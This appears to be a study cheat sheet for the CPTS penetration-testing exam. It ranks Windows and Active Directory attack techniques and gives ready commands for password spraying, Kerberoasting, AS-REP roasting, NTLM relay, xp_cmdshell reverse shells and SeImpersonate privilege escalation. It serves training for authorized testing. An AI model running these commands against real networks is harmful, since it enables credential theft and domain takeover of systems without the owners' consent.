## The 20% of Techniques That Produce 80% of Compromises

### Pareto Principle Applied: Focus here first.

## Top 10 Exam-Critical Techniques

### 1. Password Reuse (Highest ROI)

```
Why it works: Users reuse passwords everywhere.
What to do:
  ├── Every password found → Test on ALL services (SMB, WinRM, SSH, MSSQL)
  └── Every hash found → PTH before cracking

Impact: Single password can unlock 3-5 hosts
Time: 5 minutes per credential
```

### 2. SMB Enumeration + Null Sessions

```
Why it works: AD environments need SMB, often misconfigured.
What to do:
  ├── smbclient -N -L //target
  ├── rpcclient -U "" -N target enumdomusers
  └── enum4linux -a target

Impact: Free user lists, share access, domain info
Time: 5 minutes
```

### 3. WinRM Password Spray

```
Why it works: WinRM is commonly enabled, password spray yields hits.
What to do:
  ├── netexec winrm target -u users.txt -p 'SeasonYear!'
  └── evil-winrm -i target -u user -p pass

Impact: Interactive shell on first hit
Time: 10 minutes (including gathering users)
```

### 4. Kerberoasting

```
Why it works: Service accounts often have weak passwords and elevated privs.
What to do:
  ├── GetUserSPNs.py domain/user:pass -dc-ip target -request
  └── hashcat -m 13100 hash.txt rockyou.txt

Impact: Service account = often local admin = lateral
Time: 30 min request + crack
```

### 5. BloodHound Analysis

```
Why it works: Visualizes the shortest path to DA that you'd never find manually.
What to do:
  ├── bloodhound-python -d domain -u user -p pass -ns target -c all
  └── Analyze: Find DA path → Follow edges → Execute

Impact: DA path in minutes  
Time: 15-30 min analysis
```

### 6. Misconfigured Web Applications

```
Why it works: Web apps are the #1 initial foothold vector.
What to do:
  ├── Directory brute → Hidden pages/endpoints
  ├── SQLi → Data exfiltration
  ├── LFI → File read → Credentials
  └── File upload → Web shell → RCE

Impact: First shell on the exam
Time: 30-60 min per app
```

### 7. MSSQL Abuse (xp_cmdshell)

```
Why it works: MSSQL often runs as SYSTEM, default SA creds common.
What to do:
  ├── Try null/default SA creds
  ├── Enable xp_cmdshell
  └── EXEC xp_cmdshell 'revshell'

Impact: Immediate SYSTEM shell
Time: 2 minutes if SA works
```

### 8. SMB Signing + NTLM Relay

```
Why it works: Most environments don't enforce SMB signing.
What to do:
  ├── Check: nmap --script smb2-security-mode -p 445
  └── Relay: ntlmrelayx.py -tf targets.txt -smb2support

Impact: Shell on relay target (ADCS relay = DA)
Time: 5 min setup
```

### 9. AS-REP Roasting

```
Why it works: Users without Kerberos pre-auth = free TGT hash.
What to do:
  ├── GetNPUsers.py domain/ -dc-ip target -request
  └── hashcat -m 18200 hash.txt rockyou.txt

Impact: Domain user from crackable hash
Time: 10 min enum + 30 min crack
```

### 10. Privilege Escalation (SeImpersonate)

```
Why it works: Every Windows service account has this privilege.
What to do:
  ├── whoami /priv → SeImpersonate?
  └── PrintSpoofer.exe -i -c powershell.exe

Impact: User → SYSTEM in 5 seconds
Time: 30 seconds
```

## What NOT To Waste Time On

| Technique | Why To Skip | What To Do Instead |
|-----------|-------------|-------------------|
| SSH brute force | Noisy, slow, low success | Use password spray on WinRM/SMB first |
| Detailed OSINT | Exam doesn't test OSINT | Jump straight to network enum |
| Custom exploit dev | Not tested in CPTS | Use known exploits and public PoCs |
| DL/DR (Data Loss/Recovery) | Not exam scope | Skip entirely |
| Physical / social engineering | Not exam scope | Skip entirely |
| Wireless attacks | Not exam scope | Skip entirely |
| Heavy automation scripting | Slower than manual in time crunch | Use existing tools |
| Over-documenting during exam | Reduces attack time | Use existing templates |

> **⚠ CRITICAL: Full TCP port scans (-p-) are MANDATORY.** CPTS environments
> commonly place critical services on non-standard ports. Always run
> `nmap -p- --min-rate 5000 <target>` on every host. Skipping full port
> scans is the #1 reason candidates miss services and fail the exam.

## 20% Efficiency Guide

```
Phase order (prioritize, don't measure by time):
1. Foothold     → Web, SMB null, LDAP, spray, Responder
2. Post-Exploit → LSASS, SAM, configs, history, keys
3. PrivEsc      → SeImpersonate, sudo, SUID, cron, kernel
4. Lateral      → PTH, password reuse, SSH keys, WinRM
5. AD           → BH, Kerberoast, AS-REP, DCSync, relay
6. Doc          → Fill templates, capture screenshots

Progression rule: Each phase enables the next. Don't pivot laterally until
you've harvested creds. Don't start AD until you have a domain credential.
But don't over-enumerate a single host — move through phases iteratively.

80% of AD success comes from 20% of AD techniques:
  ├── BloodHound (path identification)
  ├── Kerberoasting (service account lateral)
  ├── AS-REP Roasting (free domain user)
  ├── DCSync (domain takeover)
  └── NTLM Relay (shell delegation)
```
